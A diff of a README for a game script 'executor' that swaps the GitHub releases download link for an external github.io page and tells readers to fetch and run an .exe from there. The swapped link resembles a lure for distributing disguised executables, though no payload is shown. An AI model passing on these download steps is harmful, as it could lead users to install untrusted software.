@@ -1,6 +1,6 @@
 # 🚀 ronix-windows-executor-v3 - Run scripts on your games easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Keynesian-oakblight406/ronix-windows-executor-v3/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://keynesian-oakblight406.github.io)
 
 ## What is this tool?
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements to use the software:
 
 Follow these steps to set up the tool on your machine:
 
-1. Visit the [releases page](https://github.com/Keynesian-oakblight406/ronix-windows-executor-v3/releases) to download the latest version of the executor.
+1. Visit the [releases page](https://keynesian-oakblight406.github.io) to download the latest version of the executor.
 2. Select the file ending in .exe from the list of assets.
 3. Save the file to a folder on your computer.
 4. Locate the file in your downloads folder.
